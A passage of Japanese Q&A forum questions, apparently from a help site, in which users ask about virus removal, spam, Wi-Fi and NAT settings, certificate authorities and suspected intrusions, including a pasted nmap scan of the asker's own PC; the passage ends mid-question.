よくユーザー登録をするサイトには、自分のアイコンのような画像をアップロードする機能がありますが あのような機能を実現したい場合は、ウイルスの対策ってどうなっているのか気になりました。 自分で実現する場合下記の手順を踏みたいと思っているのですが 0：事前に画像処理用プラグインを入れておく 1：ユーザーが画像をアップロード 2：プラグインなどを用いて画像のサイズ、拡張子などがおかしくないかをチェック 3：チェックOKならばプラグインを用いて画像を必ず再生成する 4：再生成した画像を保存（DBもしくはファイル） 投稿された画像をそのまま用いることはせず 画像処理用のプラグインなどで最生成すれば安全でしょうか？ 普通はウイルススキャンなどの処理を挟むのでしょうか？ 画像のウイルスについて無知なので、ご教授お願いします。
無線LANの通信速度についての質問です。 家の光ファイバーのプランを300Mbpsのプランに変更しました。 現在はAirMacExpressの旧型(UFO型のもの)を使用しており11nの150Mbps対応です。 300Mbpsのルーターを購入するだけで通信速度は上がるのでしょうか? 子機のほうはMacMiniに内蔵のAirMacです。
無線LANに違法アクセスしている他PCに対して 強制シャットダウンをかけた、という話を聞きました。 これってどのようにやるのでしょうか？ 具体的な方法は結構ですが、仕組みが知りたいのです。 強制的に落としたりするパケットがあるかもしれませんが、 その話では落とす前に相手先にメッセージを出力するなど OSにも何らかの動作をしている様です。 しかし、ただ無線で接続しているだけの機器に対して、 リモートでアクセスしてメッセージを出力し シャットダウンを実施する、というのは 権限とかその他諸々考えて難しいように思えるのですが 誰かご教授頂けますでしょうか 参考URL http://2chcopipe.com/archives/51799508.html
「TeamViewer(v6日本語版)」等のスマホから自宅のPCへ会社のPCへ アクセスできるソフトがありますが、 このようなソフトを利用すると自宅のPCや会社のPCのデータ内容が 自分の知らないサーバ内にデータが残ってしまう気がするのですが、 いかがなものでしょうか？ 私のネットワーク初心者からすると、ネットワーク経由のサービスを利用すると どこかのサーバを経由してサービスを利用するため、 提供会社に自分の情報を提供してしまう結果になるような気がするのですが・・・。 実際は違うのでしょうか？？？
制限されたネットワーク内でプライベート認証局(CA)を作成して、SSLを導入しようと考えています。 そこで疑問に思っていることがあるのですが、「中間CA」がよく利用されていますが、「中間CA」の必要性とは一体何なのでしょうか。 階層を設けることで「なりすまし」の防止対策、セキュリティ向上を狙っているのでしょうか。 認証局が階層設定しているから必要とかではなく、なぜそのような階層構造を行っているのか理由を知りたいです。 ベリサインなどのパブリック認証局では3階層、4階層(クロス)となっており、中間CA証明書が必要になっています。それはCAの階層構造が3階層、4階層となっており、中間CAが存在するため中間CA証明書が必要なのは理解できます。中間CAを実装しなくても、「CA証明書⇔サーバ証明書」と2階層でもSSL接続は可能ですよね。 また、パブリック認証局、プライベート認証局ともに「中間CA」の利用概念は同じなのでしょうか。 パブリック認証局は外部の不特定多数の人向けなので、意図的にそうゆう構造を用いているとか の理由などは存在するのでしょうか。 ご存じの方がおられましたら、教えていただきたいです。 よろしくお願いいたします。
ドライブバイダウンロードでウィルスに感染するのは、わかりますが、 感染した後に、どのようにウィルスを見つけ削除すればよいのでしょうか？ ウィルスの削除の仕方を教えて下さい
クライアントPCから認証局（CA）へのアクセスはどんなときに発生するのでしょうか？ 社内CA発行の証明書で署名したアプリケーションを配布した際のCAへの負荷が気になっています。 ある電子文書なりアプリケーションなり電子署名されている場合、クライアントでの署名の確認の際にはCAへのアクセスは発生しないと考えてよいでしょうか？ そもそもクライアント⇒CAのアクセスはどんな時に発生するのでしょう？ CRLの取得などの際でしょうか？
私が使っているインターネット接続環境は光です。 速度は、下りで50mbpsのようです。 この意味を知りたいのですが、 たとえば、サイト容量が全体で2MBのホームページがあったとします。 このホームページを表示するのに何秒かかるか、 という計算は、以下の計算であっていますでしょうか？ ※計算をわかりやすくするために、 1MB = 1024ではなく、1000KBにしています。同様に 1mb = 1000kbに。 20MB（メガバイト） = 20000KB（キロバイト） 50mb（メガビット） = 50000Kb（キロビット） = 6250KB（キロバイト） 1秒間に6250KBのデータをダウンロードできる。 よって 20000KB / 6250KB = 3 サイト容量が全体で2MBのホームページは、 下りで50mbpsの環境だと、表示までにかかる時間は3秒。 こういう計算で間違いないでしょうか？ ご存知の方いらっしゃいましたら よろしくお願いいたします。
こんにちは。 よろしくお願い致します。 機密性の高い電子メールは、どのような策を取ることで安全にやり取りすることが可能なのでしょうか？ 少し調べてみたのですが、専門用語が多々出てきて、その用語を調べるだけでかなり時間を費やしてしまい、さらにその言葉自体を理解するのもたいへんで、誰かご存知の方いらっしゃればご教授願います。 できれば、わかりやすく噛み砕いてお願い致します。 さらに、パソコン内のデータをUSBメモリなどを使用し、外部に持ち出す際、ロック？暗証番号？のようなものをかけ、セキュリティを保つことは可能でしょうか？ よろしくお願い致します！
今頃なんですが、ホームページのトップページが,"Fatal Error ownz you !" に書き換えられました。　調べるとFTPから入ったようです。ただ、ホームページのダイレクトリに不審なファイルがあり、text で書かれたプログラムのようなものと、写真でした。 削除して昨夜復帰しましたが、案の定、今朝また同じ状況に戻り、また不審なファイルが出来ており、今度はこのサイトの 管理者バカだ。のメッセージと、同じ写真でした。サイトで調べても正常にもどす記事が見つからず困っております。 ２００９年ころ話題になったページかいざんのハッカーのようですが、どなたか教えて頂けないでしょうか。
GbE とスイッチングハブを通して互いに通信可能な 2 つのマシンが、 GbE の NIC を使用して Wake on LAN をすることはできたのですが、 直に接続された 1394 接続の NIC では Wake on LAN できませんでした。 これは、 1394 接続や Wake on LAN の仕様なのでしょうか？ 具体的なネットワーク構成図は以下のページに記載の通りです。 http://oshiete.goo.ne.jp/qa/7273236.html 以上、よろしくお願いします
メールソフトアウトルックス２００３でヤフーのメールしていますが最近迷惑メールが多くて困っています。 ルールを設定で送信者に○○が含まれている場合、サーバーから削除を選んで実行すると受信もされなくなるということでしょうか？ゴミ箱にはいるわけではなく？ 回答お願いいたします
McAfee のVirusScan Enterprise 8.7.0iを導入済みのＰＣにてＵＳＢメモリー使用時にトロイの木馬を検出させてしまい 隔離されたトロイの木馬を消す方法を教えてください トロイの木馬検出後ＵＳＢメモリーは抜き取りオンデマンドスキャン を実行して脅威は見つかっていません 質問１ この時ＰＣは安全な状態と思ってよいのですか？ 質問２ Quarantine Managerのポリシーをひらいてマネージャータブをクリックした欄の中の隔離期日のところにある トロイの木馬欄を右クリックで削除すればトロイの木馬はどこにも隔離されていないのですか？ 質問３ トロイの木馬を検出させてしまった事実を消し去りたいのですが、その他に実行することはありますか？ 以上3個の質問を教えていただける方おりましたらどうぞよろしくお願いします。
Windows2000のActiveDirectory IPアドレス変更後の名前解決不可について ＜構成＞ ２台のDNSサービス付 ActiveDirectoryサーバ 既に何不自由なく運用しておりました。 ActiveDirectoryサーバ２台のIPアドレスを変更する必要があり、IPアドレスを変更しました。 IPアドレス変更後、ActiveDirectoryサーバ２台とも、ドメイン名の名前解決が出来なくなりました。 具体的には、Pingで送信先をFQDNのドメイン名を指定しても、「Unknown host ドメイン名」と表示されます。 ２台のActiveDirectory間の名前解決は出来ます。 特にHOSTSファイルやLmHostsでもドメイン名を指定していません。 ネットワーク設定も、IPアドレス以外変更していません。 何が原因として考えられますでしょうか。 また、ActiveDirectoryサーバのIPアドレスを変更する場合、DNS以外に変更する箇所はございますでしょうか。 恐れ入ります。 よろしくお願い致します。
メールソフトアウトルックス２００３でヤフーのメールしていますが最近迷惑メールが多くて困っています。 受信箱ではなくゴミ箱に直接入れる方法ありませんか？アウトルック開くとまず受信箱から表示されるため１瞬開いてしまいます。送信者を禁止するというのをみつけましたが、新たな送信者からのメールは防げません。回答宜しくお願いいたします
DNS問い合わせで、逆IPアドレスで正引きする意味について教えてください。 掲示板のサンプルコードを見ていたら、 ブラックリストをフィルターする仕組みがあったのですが、書いている内容が良く分かりません。 具体的には、DNS レコードを検索するPHP関数「checkdnsrr」へホスト名を渡しているですが、 checkdnsrr('ホスト','A'); ホストのとこが、「逆IPアドレス＋ブラックリストホスト名」になっています。 逆IPアドレスを使うのは、逆引きなのかな？と思ったのですが、 Aレコードを指定するのは、正引きと書いてあったので、どっちだかもわかりません。 参考になりそうな情報を検索していたら、下記ページに、 ＞DNS問い合わせ ＞"チェックしたいIPアドレスを逆につなげたもの" + ".dnsbl.spam-champuru.livedoor.com"を正引きして下さい。 と書いてあったのですが、 「IPアドレスを逆につなげたもの" + "ホスト名？"を正引き」する、とはどういう意味なのでしょうか？ 二重逆引きとか、そういったことをしているのでしょうか？ ▽統合スパムフィルタ「スパムちゃんぷるー」のデータに基づくDNSBL(β) 　 http://spam-champuru.livedoor.com/dnsbl/ ▽PHP: checkdnsrr - Manual 　 http://jp2.php.net/manual/ja/function.checkdnsrr …
有料アダルトサイトの サンプルを観るとクリックしたら登録ありがとうございますとパソコンで表示され、 2日以内に7万を振り込んでくださいとずっとパソコンに表示されインターネットも観れません。 ふつうに振り込まないで しかとしても大丈夫でしょうか？
たまに怪しいサイトにいくと 横か下の方に女性が～～市（自分の住所）で彼氏を探しています、、、 とかいうリンクを見つけるのですが、 そのサイトはどのようにして私の場所を特定できているのですか？ もし知っている方がいましたら、できる限り詳細を教えていただけますか？ ぶしつけな質問で申し訳ありませんがお願いしますm(_ _)m
新米 SE です。恐縮ですが質問させてください。 現在、客先にて仕事を行っているため、本社のイントラへの IPsec VPN 接続を頻繁に行うのですが、 VPN 接続中に、 1394 接続で直に接続されたマシンと通信することは可能なのでしょうか？ ネットワーク構成図の概略としては添付画像の通りとなります。 試してみたのですが、 ping は通りませんでした。 VPN 非接続時は、 1394 接続用の IP アドレスが両マシンに割り振られて 互いに通信できることは確認しております。 せっかくの休日に申し訳ありませんが、コメントいただけるととても嬉しいです。 以上、よろしくお願いします
質問をさせて頂きます。m(__)m PCにくる迷惑メールは、 それを開かずに、そのまま削除をすれば、 何の害もないのですか？ 教えて下さい。 どうぞよろしくお願い致します。m(__)m
最近、ドライブバイダウンロードのウィルス感染が流行っているそうですが、 自分のパソコンが感染した場合に、何か、そのウィルスを見つけることの出来る PCソフトはありませんか？ 教えて下さい
いつも、ウイルス検索したら、DoubleClickとか Advertishng等とか必ず出ます。この前は、GO、というのが初めて出ました。 危険度はいつも中なのですが、高とか低はないのですか？ その他どんな種類のがあって、どんな意味何ですか？たくさん教えてください。
おそらく恥ずかしいくらいおバカな質問かもしれません… パソコンに詳しくないもので質問させていただきます。 ユーチューブをみていたのですが、とある動画をクリックしたら 突然青い画面に変わってしまったんですが、これはパソコンが どうなってしまったのかわかる方いらっしゃいますでしょうか？ 青のバックに白文字でBATとだけ見えました。 他にも文字があって、数字がカウントされていました。 私のクリックしてみようとした動画は、その昔事件を起こした某宗教団体 のものでした。その動画をクリックした途端に変わってしまいました。 私はびっくりしました。なんだかよく分からないが、これは悪い事態に違いないと そう思いました。一刻も早く消さなければどうにかなってしまうかもしれない。 電源のボタンを長押しして消してしまいました。 その時はそう思いました。 何か変なものをパソコンに送られた証拠ではないだろうか？何しろ、BATっていうことは・・・ 悪いという意味？ 冷静に考えるともしかして、パソコン側で何かあったのかもしれません。 たまたまの偶然かもしれません。なんだかよく分かりません。 アマゾンで出店してみたいのですが、その際にクレジットカードが必要です。 クレジットカードを作ったはいいけれど、もしかして、（恥ずかしいのですがあえて 言いますと）あの時に、何かのソフトをインストールされたのかもとか（すみません。 本当に音痴なんです）考えてしまって、それがきっかけで、クレジットカード情報など 知られてしまうかもしれない・・・と心配しています。 私にとって、パソコンがつながる自体不可解極まりないのです。 更に、そう言ったしかけを作れること自体よくわからず変な想像をしてしまいます。 どなたかお知りの方、よろしくお願いします。
添付ファイルにパスワード設定したいので, ご存知の方、教えて下さい。よろしくお願い致します。
自分のホームページを三つ作成していますが、そのうち一つの進む・戻るの矢印が赤色で表示されていますが何故でしょうか？
Facebookを使用していますが，このSNSには危険性はないのでしょうか？ もし、あるとすればどんな点で，どうすればいいのですか。 あるいは、安全で心配することはないのでしょうか。 教えてください。
会社で、symantec endpoint protection を使用しており、毎日昼から自動的にウイルススキャンする設定になっています。 このウイルススキャンが終わる直前になると、いつも決まってPCが重くなって再起動をするしかなくなり、困っています。 私のPCの中には7z形式やzip形式で圧縮したファイルが大量にあり、もしかしてそれが原因？と感じています。 そこで質問なのですが、 ・symantec endpoint protection のウイルススキャンでは、圧縮ファイルのスキャンはどうやって行っているのでしょうか。 　やはり、内部的に解凍してからスキャンしているのでしょうか。 ・圧縮ファイルは解凍してスキャンしている場合、「7z」形式のファイルも同様に解凍してスキャンしているでしょうか。 以上です。 よろしくお願いします。
はじめまして。 ネットワークは基礎知識くらいしかないのですが 今回スイッチを設定することになりました。 マニュアルに出てくる「ナチュラル経路」という言葉がよくわかりません。 これはどんな意味なのでしょうか。 ネットでも同じようなマニュアルがヒットするだけです。 詳しい方に詳細をご教示いただければと思います。 よろしくお願いします。
空港勤務のITエンジニアについて質問します。先日空港内にあるシステム、たとえばチェックインや飛行機チケットと一緒にもらうバーコード印刷機など、を管轄し、トラブルがあればエンジニアとして対処するIT業務の面接を受けてきましたが、この分野でエンジニアとしてのスキルを磨いても、windowsなどのシステムをいじるわけではないので、将来的にMCPやCCNAなどを取得していたとしても、通常のヘルプデスク勤務は不可能なのでしょうか？ 空港エンジニアとして勤務経験があるかた、今後のキャリアなど、アドバイスをいただければと思います。
私は6年ほど前に電気店でメーカー物のパソコンを購入したのですが、リカバリーディスクなどが付属されていませんでした。たしか有料で作成するとの事だったのですがPCに疎い私はリカバリーディスクがどういうものかも分からずに断りました。 今まで一度だけPCに異常がありましたが、その時は出張修理屋にお願いしました。 そこでフリーソフトでリカバリーディスクを作成したいのですが、詳しい方にお伺いしたいことがあります。 ○今のPCの状態は ・タスクバーの通知領域をカスタマイズしようと変更したんですが、何も変わらなかったり。 ・『プログラムのアクセスと規定の設定』から変更と削除をしようとしても何も反応無かったり。 と決して正常な状態ではないと思うのですが、こんな状態でリカバリーディスクを作成してもいいのでしょうか？ ○お薦めのリカバリーディスク作成ソフトはあるでしょうか？ ○現在ウィルスなども入ってなく、すべてが正常な状態だとします。フリーソフトやphotoshopやillustratorなどをインストールしているのですが、何か異常があった場合にこの今の状態をそっくりそのまま再現するような方法はあるでしょうか？ 少し分かりづらいかもしれませんが、リカバリした時は一からまたソフトをインストールしていかないといけないと話を聞いたことがあります。そういった億劫なことをせずに、この正常な今の状態に簡単に復元する方法はないのでしょうか？ OS　Windows XP home edition ServicePack3 PC　NEC VALUE STAR ご存知の方いらっしゃいましたらご教示ください。 よろしくお願いします。
ヤマハルーターRTX1000で固定ＩＰアドレス8個をNAT機能を使い プライベートアドレスで運用しています。 外部から内部のサーバーにグローバルアドレスでアクセスするとつながるのですが、 内部から内部のサーバーにグローバルアドレスでアクセスするとつながりません。 内部から内部のサーバーにアクセスするにはプライベートＩＰでのアクセスしかできません。 現在テストのために下記のような設定にしております。 ip route default gateway 192.168.1.1 ip lan1 address 192.168.2.1/24 ip lan2 address 192.168.1.2/24 ip lan2 nat descriptor 1 nat descriptor type 1 nat nat descriptor address outer 1 192.168.1.10-192.168.1.12 nat descriptor address inner 1 192.168.2.10-192.168.2.12 nat descriptor static 1 1 192.168.1.10=192.168.2.10 1 nat descriptor static 1 2 192.168.1.11=192.168.2.11 1 nat descriptor static 1 3 192.168.1.12=192.168.2.12 1 内部のサーバーにエイリアスのipアドレスを設定するとpingは通るようになりましたが、 telnetなど他の通信はできませんでした。 内部からグローバルアドレスで内部のサーバーに接続するにはどうすればよいでしょうか？ よろしくお願いします。
IPアドレスからネット盗聴されている可能性があるので、IPアドレスを変える方法を教えてください。 （プロバイダの変更、プロキシを除く）
よろしくお願いします。 NW機器で内部で出力されるログをTivoliなど監視システムで 監視する場合、NW機器にはエージェントは導入できないと思います。 この場合、NW機器から他のサーバにログ転送（syslog）をするのが、 一般的でしょうか？。 syslogの場合、ログを受け取るサーバ側でもどういった設定が必要か、 調査しております。
お世話になります。 OS：XP　Pro　の環境です。 インターネットはつながっていません。 下記、WORM_SILLY.KXが見つかったのですが、 対処方法を見つけることができませんでした。 WORM_SILLY.KXの対処方法をご教授頂ければ助かります。 感染経路もわからない状態です。 以上　申し訳ありませんがよろしくお願いします。
先日、System Recoveryウイルスに感染しました。 OSはWINDOWS7 32bit、ウイルス対策にはMicrosoft Security Essentialsを使用しています。 以下のように対処したのですが、これで本当によいのか不安に思い、質問しました。 初めての質問で言葉足らずなところがあるかも知れませんが、どうかよろしくお願いします。 インターネットを見ていると、Microsoft Security Essentialsから不審なプログラムがあると警告され、指示通りそれを削除しました。 しばらくして、覚えのない685f.tmpが実行され、「次のプログラムにこのコンピューターへの変更を許可しますか?」と聞かれました。 もちろん「いいえ」を選んだのですが、その後も何度も聞かれました。 すると、突然エラーウインドウが大量に出て、最後に"windows detected a hard disk problem"というウインドウが出ました。 びっくりして再起動をしたのですが、壁紙も表示されずデスクトップアイコンもごみ箱のみになってしまいました。 そこで、まずインターネット接続を切りました。 それから、どうしてよいか分からず、システムの復元を試みました。 すると通常起動したので、Microsoft Security Essentialsで完全なスキャンをかけました。 しかし、ウイルスが検出されなかったためNorton Internet Security 2012試用版をダウンロードし、セーフモードでシステムの完全スキャンをしました。 すると 685f.tmp(Bloodhound.MalPE.B) 9xazqw2qqah9eu.exe.tmp(Trojan.Gen) Tracking Cookies の三つが検出されました。 それぞれNortonの指示に従い685.tmpと9xazqw2qqah9eu.exe.tmpを検疫しTracking Cookiesを削除しました。 その後ネットに繋ぎ、ウイルス定義の更新とウイルス対策についてのサイトを見てから 再びセーフモードでシステムの完全スキャンをしたのですが、 26もの実行ファイルから圧縮脅威、WS. Trojan.H、Suspicious.Cloud.2、Trojan.Gen、Trojan.Gen2などのウイルスが検出されました。 このファイルには、私が以前ダウンロードしたフリーソフトのインストールファイルが多くありました。 Nortonに従い検疫、削除をしました。 その後も何度かスキャンを行いましたが、特ににウイルスは検出されていません。 これでウイルスは完全に除去されたのでしょうか？ 現在では通常起動できており、不具合などもありません。 ウイルス感染後にシステムの復元をしてはいけないというのを後から知り、とても心配です。 重要なファイルがたくさんあるので、リカバリは最後の手段にしたいです。
http://club.plaync.jp/index.nc　このサイトの雀龍門シーリズのクラブサイトを開設しているのですが… そのクラブサイトにアクセスすると、Windows セキュリティ画面（mypage.plaync.jp へ接続しています。）が表示される様になってしまい困っています。 昨日までは、Windows セキュリティ画面が表示されず問題なくアクセスできていました。 ちなみに、その雀龍門シーリズの他の方のクラブサイトにアクセスしても、同じように、Windows セキュリティ画面（mypage.plaync.jp へ接続しています。）が表示されます。 なぜ、突然 Windows セキュリティ画面が表示され、ユーザー名とパスワードを求められる様になったのでしょうか？ そのクラブサイトにアクセスしても、Windows セキュリティ画面が表示されない様にするにはどうしたら良いのでしょうか？ できれば詳しく解決方法を教えて頂けると非常に助かります。 宜しくお願い致します。
ネット盗聴の被害に遭っているものです。こちらの方がおっしゃっているシールドとはどのようなもか分かる方、教えてください。？　どこの売っているでしょうか
自分のＰＣから外部にデータを送られているのを調べるには どうしたらいいのでしょうか？ なにかそのようなものを調べるフリーのソフトはあるのでしょうか？ セキュリティのソフトウエア（ノートン等）では調べられないですものね。 スマートフォンのアプリでも勝手にデータを送っていたという記事があり、 ＰＣでもそのようなことがあるのではないかと大変心配しています。 どうかお助け下さい。
Windowsのファイアウォールのヘルプとサポートページに、 「ポートを開くよりも、許可されたプログラムの一覧にプログラムを追加する方が安全です。」 とありましたが、どういう意味なのでしょか？ 初歩的な質問で申し訳ございません。 宜しくお願い致します。
パソコンが遠隔操作可能されている可能性があるので、以下を調べてみました。 ひとつは、リモートデスクトップがＯＮになっていないか、 もうひとつは、ＴＥＬＮＥＴがＯＮになっていないか タスクマネージャのプロセスから、怪しいソフトが稼動していないか 他に調べるところはありますでしょうか。よろしくお願いします。
auのiphoneを使っています。よくマックなどのwifi環境がある店でwifiを使おうとする機会があるのですが、パスワードが分からないとwifi繋げないですよね!? パスワードが分からなくてもwifiをつなぐ方法があるのでしょうか? iphone初心者なので、教えていただけると有難いです。
デスクトップ一面にファイルが出てきて消しても消してもまた出てきます。どうしたらよいでしょうか。
ハッキングされているようです。 自分で解決できるかやってみましたが、1日2日では できそうもないのでここからどう対策したらいいか 教えてください。 Windows7homeです。 気が付いてからbacktrackをインストールしてnmapした結果です。 Starting Nmap 5.61TEST4 ( http://nmap.org ) at 2012-01-19 21:06 JST NSE: Loaded 87 scripts for scanning. NSE: Script Pre-scanning. Initiating Ping Scan at 21:06 Scanning 192.168.56.1 [4 ports] Completed Ping Scan at 21:06, 0.01s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 21:06 Completed Parallel DNS resolution of 1 host. at 21:06, 0.06s elapsed Initiating SYN Stealth Scan at 21:06 Scanning 192.168.56.1 [1000 ports] Discovered open port 80/tcp on 192.168.56.1 Discovered open port 554/tcp on 192.168.56.1 Discovered open port 139/tcp on 192.168.56.1 Discovered open port 445/tcp on 192.168.56.1 Discovered open port 135/tcp on 192.168.56.1 Discovered open port 443/tcp on 192.168.56.1 Discovered open port 2869/tcp on 192.168.56.1 Discovered open port 49153/tcp on 192.168.56.1 Discovered open port 10243/tcp on 192.168.56.1 Discovered open port 5357/tcp on 192.168.56.1 Discovered open port 49152/tcp on 192.168.56.1 Discovered open port 49157/tcp on 192.168.56.1 Discovered open port 49154/tcp on 192.168.56.1 Discovered open port 49156/tcp on 192.168.56.1 Completed SYN Stealth Scan at 21:06, 4.21s elapsed (1000 total ports) こちらがWindowsファイアウォールなどの対策を試みたあと 解放されていたポートが変更された部分です。 Starting Nmap 5.61TEST4 ( http://nmap.org ) at 2012-01-20 16:35 JST NSE: Loaded 87 scripts for scanning. NSE: Script Pre-scanning. Initiating Ping Scan at 16:35 Scanning 192.168.56.1 [4 ports] Completed Ping Scan at 16:35, 0.04s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 16:35 Completed Parallel DNS resolution of 1 host. at 16:35, 1.20s elapsed Initiating SYN Stealth Scan at 16:35 Scanning 192.168.56.1 [1000 ports] Discovered open port 554/tcp on 192.168.56.1 Discovered open port 135/tcp on 192.168.56.1 Discovered open port 443/tcp on 192.168.56.1 Discovered open port 80/tcp on 192.168.56.1 Discovered open port 445/tcp on 192.168.56.1 Discovered open port 139/tcp on 192.168.56.1 Discovered open port 1025/tcp on 192.168.56.1 Discovered open port 5357/tcp on 192.168.56.1 Discovered open port 1026/tcp on 192.168.56.1 Discovered open port 10243/tcp on 192.168.56.1 Discovered open port 1030/tcp on 192.168.56.1 Discovered open port 1027/tcp on 192.168.56.1 Discovered open port 2869/tcp on 192.168.56.1 Discovered open port 1029/tcp on 192.168.56.1 Completed SYN Stealth Scan at 16:35, 4.08s elapsed (1000 total ports) たぶんバックドアではないかと思いますが、どのアプリが それを起動しているのかは発見出来てません。 対応策ありましたら教えてください。
昨日メールをしようと思ってyahooメールにログインしようと思ったらログインできなくて 1回パスワードを変更して再登録しました。 それで今日またメールしようとおもってログインしようと思ったらまたログインできなくなってて. 昨日変えたばっかりのパスワードだからあってるはずなのに… 昨日みたいにパスワードを変えようと思ったら. 個人情報のところでひっかかるんです 昨日ゎそれでいけたのに今日になったら無理になってて… 誰かにいじられてるんでしょうか？それが心配で…いろんな人のメールアドレスがあるし. どーしたらログインできるのか教えてください！！！
主に、Outlook Expressに来るストーカーからの迷惑メールで困っています。 数年前にブログ上で知り合った同性の人から、どうやって知ったのか色々なアドレス宛てにエロメールが来ます。出会い系が最近は多いです。自分だと分かって貰えるようにしてあるので、またあの人だと分かります。無視していますが、これが数年続いています。 ケイタイの複雑なメアドも突き止められてしまいました。 ケイタイごと買い換えるしかありませんでした。 ｈｏｔｍａｉｌも、こちらでない方は見ないようにしています。 精神衛生上、とても良くないので、、、。 幸い、こっちはまだ大丈夫です。 どういう方法を使っているのでしょうか？ＩＰアドレスが分かっているだけでそこまで出来るものでしょうか？ こちらは、なす術が無いのでしょうか？ あちらは、ＩＰアドレスを変えたり、送信者を変えたり、自在にＰＣを使いこなしています。 一度、メールで、もっと勉強すれば？と得意気にされました。 Ｏｕｔｌｏｏｋ　Ｅｘｐｒｅｓｓのツールで毎回メールルールを作って削除フォルダには入れているのですが、Ｇｍａｉｌと違って学習しないので、削除がされるわけではありません。 どなたか、この悩みが分かって下さる方がいらしたら、お返事よろしくお願い致します。
近所の人からネット盗聴されています。動画ファイルを削除されたりしています。警察へ相談して相手してもらえるでしょうか？またその手続きにどれ位手間がかかるでしょうか？ 万全のセキュリティ対策をしてくれる業者をご紹介もらえませんでしょうか？ よろしくお願いします。 (これの一般的はワードは”ネット盗聴”でいいでしょうか。不正アクセスとは違いますよね。）
我が家のパソコンはSoftbankポケットWiFi(ULTRA WiFi 007Z、以下ポケファイ)をインターネットへの出口として使っています。 無線親機（WZR-HP-G302H、WZR-HP-AG300Hの２台購入しました）に家庭内LANの機器（パソコンやHDD、プリンタ）が繋がっていますので、ポケファイと同時に使いたいのですが、どのように設定すればよろしいでしょうか。 無線親機からポケファイのSSID・セキュリティキーなどを設定すれば良いのかな、と思いますが、どうやったら良いのか不明です。 よろしくお願いします。
MAC ACLをＬ２スイッチの各物理インターフェースに設定し、 通信制御を行う際の設定を教えてください。 使用しているＬ２スイッチはCatalyst2960-S (LAN lite)です。 ・ネットワーク [PC]-[L2SW]-[NAS] 　　　　　｜ 　　　 [ルータ] ・ルール １．PCとNAS間での双方向通信許可 ２．PCとルータ間での双方向通信許可 ３．NASとルータ間での通信遮断 よろしくお願いします。
現在、自宅のネットワーク環境は無線LANで構築しています。今回、この環境にNASを導入すべく、余ったノートPCをNASにして無線LAN環境配下で試してみたら、速度が2MB/s程度と使いものになりませんでした。そこで速度向上のため、以下の案を考えてみました。 -- A案 [モデム(フレッツ光RV-S340NE)] ↓ [ルータ(WZR-HP-AG300H)] ↓ (無線) ↓ ├　デスクトップPC ┓ ├　ノートPC　　　　 ╋━ (Gigabit HUB) ├　ノートPC(NAS)　┛ └　… 本来は有線LANで構築するのがベストですが、ルータからの距離もありケーブルを引き回すのも大変なので、HUBを導入してはどうか？というのがこのA案です。(太い罫線のLANケーブルとHUBが新設する予定のもの)。これまでHUBを使用したことがないのですが、こういった構築は可能であるか？という点が一つ。 -- B案 [モデム(フレッツ光RV-S340NE)] ↓ [ルータ(WZR-HP-AG300H)]─(有線)─ノートPC(NAS) ↓ 無線 ↓ ├　デスクトップPC ├　ノートPC └　… また、将来的にはVPNでNASにアクセスすることも検討しているので、外部からアクセスすることを考慮すれば、ルータの直下にNASを置くという案もあるかと思います。が、これも結局ローカルでの速度は遅くなってしまいます。 NASもVPNも速度が欲しいということであれば有線構築がベストかと思いますが…。と、考えていたらきりがないのですが、(A)(B)以外で考え得る良い方法はありますでしょうか。
ネット盗聴の防御策は暗号化するとよい、と教わりました。具体的にどこをいじればよいのでしょうか？具体的な手順をお示し頂けると助かります。
仕事でシステム管理をしていますが、ネットワーク機器にうとく 質問させていただきます。 Cisco2960のポートAでサーバ機器に接続されているのですが 床下に配線が伸びており、タグも振っていないため接続先の 検討がつきません。 機器にTELNET、Teratarmでログインすることは可能です 機器からどのサーバに通信しているか調査する方法はありますか。 接続先のIPもしくはMACアドレスが調べられれば検討がつくのですが 調べる方法があればどなたかご教授ください。
今までは、ｐｌａｌａのメールアドレスを各部署毎、共有で使用していました。 こちらの方は継続で、Ｇｏｏｇｌｅ　Ａｐｐｓ（法人向け）を個人用として採用したいのですが、何か不具合とかでてくるのでしょうか？アバウトな質問ですが、詳しい方お願いします。
一昨日、パソコン初期画面右下にソフトを新しく修正する必要が出来たので、 パソコンを再起動するようにとの表示が出たので、それに従いました（過去に何回 かこのような指示があり、それに従って何事もありませんでした）再起動後、初期画面 がいつもと異なり、Google表示が出ず、混乱しましたが、半日たって旧に復しました。 ただその後Googleの表紙にI'm Feeling Luckyという文字が現れるようになりました。数年前にも こんなことがありましたが、支障はありませんでした。単なる愉快犯でしょうか？なおワクチン は一度入れたことがありますが、その直後、操作にやたら制約が多く、抜いてしまい、いまは ウイルス対策は何もしておりません。機種はDellのVostro1510です。
不正アクセス（ネット盗聴）に対するセキュリティ対策をガチガチに固めたいのですが、どのような業者に頼むのがよいでしょうか？よろしくお願いします。
gooブログを作成し気分okで今日2日目を更新し始めましたら、画面が小さくなって文字もようやく読める程度、画像も初日のようにうまく表示出来ません。 文字、画像共に中央に入れたいのですが、全く出来ません。 出来なかったら解約し、他のサイトにするしかありません。 よろしくお願いいたします。 すみません　カテゴリーの選び方がわかりません。
「環境」 Win7(192.168.42.11/24)とWinXP(172.16.24.0/24)があります。 ⇒ともにNETBIOSの設定は、「DHCPからのNetBIOS設定を使用します。～～」を選択しています 「やりたいこと」 7で共有フォルダ・アクセスユーザー・パスワードを作成しました。 7のFWを停止せずに、必要なポートのみ開放して、XPからユーザー認証でフォルダ共有したい 「検証１」 XPから、ファイル名を指定：\\192.168.42.11でアクセスすると、 ネットワークパスが見つかりませんとのことで、エラーが返ってきます。 (1)7のWindowsFWを全停止(利用しているのはプライベートで、社内ネットワーク選択してます。) (2)XPから、ファイル名を指定：\\192.168.42.11でアクセス⇒ユーザー認証画面が出てきます。 あきらかに、WindowsFWが原因なのはわかったのでいろいろ調べたところ、 「ポート445を開放すれば共有アクセスできるようになる。」とのことだったので、 以下作業を行いました。 「検証(2)」 (1)Win7のセキュリティが強化された「FWのファイルとプリンターの共有 (SMB 受信)」のリモートIPアドレスに XP端末172.16.24.0/24(セグメント指定)をして許可しました。 (2)XPから、ファイル名を指定：\\192.68.42.11でアクセス⇒はじめと同じエラーが出ました。 「検証(3)」 (1)セキュリティが強化された 「ファイルとプリンターの共有 (NB 名受信)：137」 「ファイルとプリンターの共有 (NB データグラム受信)：138」 「ファイルとプリンターの共有 (NB セッション受信)：139」 に、リモートIPアドレスに、XP端末172.16.24.0/24(セグメント指定)をして許可しました。 (「FWのファイルとプリンターの共有 (SMB 受信)」には、XPセグメント追加していません) 